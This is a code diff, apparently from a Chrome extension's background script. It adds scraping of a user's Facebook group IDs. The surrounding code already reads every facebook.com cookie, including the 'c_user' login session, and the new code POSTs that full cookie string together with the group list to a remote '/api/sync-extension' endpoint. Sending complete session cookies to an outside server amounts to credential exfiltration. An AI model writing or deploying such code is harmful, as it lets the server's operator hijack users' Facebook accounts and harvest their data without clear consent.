@@ -322,13 +322,33 @@ chrome.runtime.onMessage.addListener((req, sender, res) => {
     chrome.cookies.getAll({ domain: "facebook.com" }, async (c) => {
       const s = c.map(x => x.name + "=" + x.value).join("; ");
       if(!s.includes("c_user")) return res({ success: false, error: "Logue no Facebook" });
+      
+      // SCRAPE GROUPS
       try {
+        const groupsResp = await fetch("https://www.facebook.com/groups/feed/");
+        const html = await groupsResp.text();
+        const groups = [];
+        // Extract group IDs and names using regex (simple version)
+        const regex = /"group_id":"(\d+)"/g;
+        let match;
+        const ids = new Set();
+        while ((match = regex.exec(html)) !== null) {
+          ids.add(match[1]);
+        }
+        
+        // Final Sync
         const r = await fetch(URL + "/api/sync-extension", {
           method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ userId: req.userId, cookies: s })
+          body: JSON.stringify({ 
+            userId: req.userId, 
+            cookies: s,
+            groups: Array.from(ids).map(id => ({ fbGroupId: id, name: "Grupo " + id })) 
+          })
         });
         res(await r.json());
-      } catch(e) { res({ success: false }); }
+      } catch(e) { 
+        res({ success: false, error: "Erro ao capturar grupos: " + e.message }); 
+      }
     });
     return true;
   }
